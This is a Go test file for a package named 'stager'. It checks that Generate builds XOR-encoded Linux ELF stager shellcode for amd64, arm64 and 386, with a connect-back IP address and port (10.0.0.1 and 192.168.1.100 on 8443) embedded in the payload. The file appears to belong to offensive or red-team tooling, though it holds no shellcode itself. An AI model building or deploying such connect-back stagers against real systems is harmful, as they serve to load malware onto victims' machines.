package stager

import (
	"encoding/binary"
	"testing"
)

var archTests = []struct {
	name       string
	os, arch   string
	elfClass   byte
	machine    uint16
	headerSize int
}{
	{"amd64", "linux", "amd64", 2, 62, 120},
	{"arm64", "linux", "arm64", 2, 183, 120},
	{"386", "linux", "386", 1, 3, 84},
}

func TestGenerate(t *testing.T) {
	for _, tt := range archTests {
		t.Run(tt.name, func(t *testing.T) {
			res, err := Generate(tt.os, tt.arch, "10.0.0.1", 8443)
			if err != nil {
				t.Fatalf("Generate: %v", err)
			}
			bin := res.Binary
			if len(bin) < tt.headerSize {
				t.Fatalf("binary too small: %d bytes", len(bin))
			}
			if bin[0] != 0x7f || bin[1] != 'E' || bin[2] != 'L' || bin[3] != 'F' {
				t.Fatal("not an ELF binary")
			}
			if bin[4] != tt.elfClass {
				t.Fatalf("ELF class: got %d, want %d", bin[4], tt.elfClass)
			}
			machine := binary.LittleEndian.Uint16(bin[0x12:])
			if machine != tt.machine {
				t.Fatalf("e_machine: got %d, want %d", machine, tt.machine)
			}
			// Verify XOR key is non-zero
			if res.XORKey == [4]byte{} {
				t.Error("XOR key is all zeros")
			}
			t.Logf("%s stager: %d bytes, xor key: %x", tt.name, len(bin), res.XORKey)
		})
	}
}

func TestGenerateContainsIP(t *testing.T) {
	for _, tt := range archTests {
		t.Run(tt.name, func(t *testing.T) {
			res, err := Generate(tt.os, tt.arch, "192.168.1.100", 8443)
			if err != nil {
				t.Fatalf("Generate: %v", err)
			}
			sc := res.Binary[tt.headerSize:]
			found := false
			for i := 0; i+3 < len(sc); i++ {
				if sc[i] == 192 && sc[i+1] == 168 && sc[i+2] == 1 && sc[i+3] == 100 {
					found = true
					break
				}
			}
			if !found {
				t.Error("IP address bytes not found in shellcode")
			}
		})
	}
}

func TestXOREncrypt(t *testing.T) {
	key := [4]byte{0xDE, 0xAD, 0xBE, 0xEF}
	data := []byte{0x10, 0x00, 0x00, 0x00, 0x41, 0x42, 0x43, 0x44}
	XOREncrypt(data, key)
	// Verify it's encrypted
	if data[0] == 0x10 {
		t.Error("data not encrypted")
	}
	// Decrypt again
	XOREncrypt(data, key)
	expected := []byte{0x10, 0x00, 0x00, 0x00, 0x41, 0x42, 0x43, 0x44}
	for i := range data {
		if data[i] != expected[i] {
			t.Fatalf("XOR roundtrip failed at byte %d: got %02x, want %02x", i, data[i], expected[i])
		}
	}
}

func TestGenerateUnsupportedArch(t *testing.T) {
	_, err := Generate("windows", "amd64", "10.0.0.1", 1234)
	if err == nil {
		t.Error("expected error for unsupported os/arch")
	}
}

func TestGenerateInvalidIP(t *testing.T) {
	_, err := Generate("linux", "amd64", "not-an-ip", 8443)
	if err == nil {
		t.Error("expected error for invalid IP")
	}
}

func TestGenerateIPv6Rejected(t *testing.T) {
	_, err := Generate("linux", "amd64", "::1", 8443)
	if err == nil {
		t.Error("expected error for IPv6")
	}
}
